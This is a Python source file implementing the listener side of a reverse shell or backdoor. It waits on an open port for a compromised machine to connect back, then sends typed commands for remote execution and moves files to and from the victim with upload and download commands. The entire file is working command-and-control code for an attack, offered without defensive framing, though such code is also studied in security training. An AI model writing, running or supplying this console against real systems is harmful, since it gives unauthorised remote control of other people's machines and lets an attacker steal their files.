#!/usr/bin/env python3

import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Waiting for incoming connection...")
        self.connection, address = listener.accept()
        print(self.reliable_recv())
        print(f"Connection from {address} established.")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        json_data_bytes = json_data.encode('utf-8')
        length = len(json_data_bytes)
        self.connection.send(length.to_bytes(4, 'big'))
        self.connection.send(json_data_bytes)

    def reliable_recv(self):
        length_bytes = self.connection.recv(4)
        if not length_bytes:
            return None
        length = int.from_bytes(length_bytes, 'big')
        json_data_bytes = b''
        while len(json_data_bytes) < length:
            chunk = self.connection.recv(length - len(json_data_bytes))
            if not chunk:
                break
            json_data_bytes += chunk
        json_data = json_data_bytes.decode('utf-8', errors='ignore')
        return json.loads(json_data)

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        
        return self.reliable_recv()
    
    def write_file(self, path, content):
        with open(path, "wb") as file: 
            file.write(base64.b64decode(content))
            return "[+] Download Successful"

    def read_file(self, path):
        with open(path, "rb") as file: 
            return base64.b64encode(file.read()).decode('utf-8')
    
    def run(self):
        try:
            while True: 
                command = input(">> ")
                command = command.split(" ")
                try:
                    if command[0] == "upload":
                        file_content = self.read_file(command[1])
                        command.append(file_content)
                        
                    result = self.execute_remotely(command)
                    
                    if command[0] == "download" and "[-] Error" not in result:
                        result = self.write_file(command[1], result)
                except Exception:
                    result = "[-] Error during command execution."
                    
                print(result)
        except KeyboardInterrupt:
            print("\nClosing listener.")
            self.connection.close()

my_listener = Listener("0.0.0.0", [PORT])
my_listener.run()
